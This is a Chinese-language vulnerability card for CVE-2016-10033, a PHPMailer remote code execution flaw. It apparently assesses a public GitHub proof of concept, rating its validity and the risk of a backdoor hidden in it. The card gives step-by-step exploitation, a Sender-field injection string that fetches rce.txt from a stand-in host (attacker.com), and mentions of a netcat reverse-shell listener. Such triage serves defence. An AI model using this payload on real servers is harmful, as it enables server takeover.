## CVE-2016-10033 - PHPMailer Remote Code Execution

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标服务器运行存在漏洞版本的PHPMailer，且配置允许使用`mail`函数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于PHPMailer 5.2.18之前的版本中，`mailSend`函数在使用`isMail`传输方式时，未对`Sender`属性进行充分的过滤，攻击者可以通过在`Sender`属性中构造包含反斜杠双引号(`\"`)的恶意字符串，向`mail`命令注入额外的参数，从而执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。NVD和Mitre等权威漏洞库都收录了此漏洞，并明确指出是远程代码执行漏洞。搜索引擎结果也显示存在大量的关于此漏洞的分析和利用文章。

**投毒风险：**
POC代码存在一定的投毒风险，风险概率约为10%。具体分析如下：
*   **代码混淆：** POC使用了`sed`命令进行字符串替换，将`/`替换为`${substr{0}{1}{$spool_directory}}`，将空格替换为`${substr{10}{1}{$tod_log}}`，增加了代码的可读性难度，可能隐藏恶意代码。
*   **HTTP服务器：** 利用脚本启动一个简单的HTTP服务器，从攻击者的服务器下载`rce.txt` payload。这个`rce.txt`文件的内容没有提供，攻击者可以在`rce.txt`中植入恶意代码。所以如果rce.txt内容不符合预期，存在植入后门的风险。
*   **nc监听：** 循环使用`nc`监听1337端口，期望接受目标服务器的连接，如果目标服务器执行了payload，则会反弹shell。但是如果在其他命令执行前，就反弹了shell，说明rce.txt中可能存在其他恶意代码。

**利用方式：**
1.  **确定目标：** 找到使用PHPMailer并且版本低于5.2.18的Web应用程序。
2.  **构造Payload：** 构造包含恶意代码的`rce.txt`文件, 例如反弹shell的bash脚本。
3.  **启动HTTP服务器：** 攻击者启动一个HTTP服务器，用于托管`rce.txt`文件。
4.  **构造恶意请求：**  攻击者向目标Web应用程序发送包含恶意`Sender`属性的请求，该属性包含命令注入代码，例如：
    `attacker@localhost \" -oQ/tmp/ -X/tmp/rce.txt http://attacker.com/rce.txt null`
5.  **触发漏洞：** 目标Web应用程序调用PHPMailer发送邮件，由于`Sender`属性未经过滤，恶意代码被注入到`mail`命令中。
6.  **执行恶意代码：** `mail`命令执行恶意代码，从而实现远程代码执行。
7.  **清理：**  攻击成功后删除临时文件 `/tmp/rce`。

**项目地址:** [ElnurBDa/CVE-2016-10033](https://github.com/ElnurBDa/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)